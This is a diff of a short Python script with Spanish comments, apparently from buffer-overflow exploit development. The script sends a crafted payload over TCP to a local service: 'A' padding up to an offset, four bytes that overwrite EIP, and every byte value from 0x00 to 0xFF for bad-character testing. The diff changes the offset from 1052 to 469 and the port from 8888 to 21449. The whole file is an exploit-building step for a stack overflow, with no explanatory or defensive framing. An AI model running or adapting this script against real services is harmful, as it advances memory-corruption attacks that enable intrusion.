@@ -1,35 +1,25 @@
 import socket
 
-def generate_badchars(exclude=[]):
-    """
-    Genera una secuencia de bytes de 0x00 a 0xFF excluyendo caracteres específicos.
-    """
-    return bytes([x for x in range(256) if x not in exclude])
-
-def send_payload(ip, port, offset, exclude=[]):
-    """
-    Envía un payload con los caracteres malos y retorna la respuesta del servidor.
-    """
-    bad_chars = generate_badchars(exclude)
-    
+def bad_chars():
+    all_chars = bytes(range(256))  # Genera todos los bytes de 0x00 a 0xFF
+    offset = 469
     buffer = b"A" * offset
     eip = b"B" * 4
-    payload = buffer + eip + bad_chars
+    payload = buffer + eip + all_chars
 
+    # Imprimir los bad characters en formato hexadecimal
+    print("Enviando los siguientes bad characters:")
+    print(" ".join(f"\\x{b:02x}" for b in all_chars))
+
+    # Envío del payload al servicio remoto
     try:
         s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-        s.connect((ip, port))
+        s.connect(("127.0.0.1", 21449))
         s.send(payload)
         s.close()
-        print(f"[+] Payload enviado con {len(bad_chars)} posibles bad chars.")
+        print("\nPayload enviado con éxito.")
     except Exception as e:
-        print(f"[-] Error al enviar el payload: {e}")
+        print(f"Error al enviar el payload: {e}")
 
-# Configuración
-TARGET_IP = "127.0.0.1"
-TARGET_PORT = 8888
-OFFSET = 1052
-
-# Primer intento sin excluir caracteres
-send_payload(TARGET_IP, TARGET_PORT, OFFSET)
+bad_chars()
 
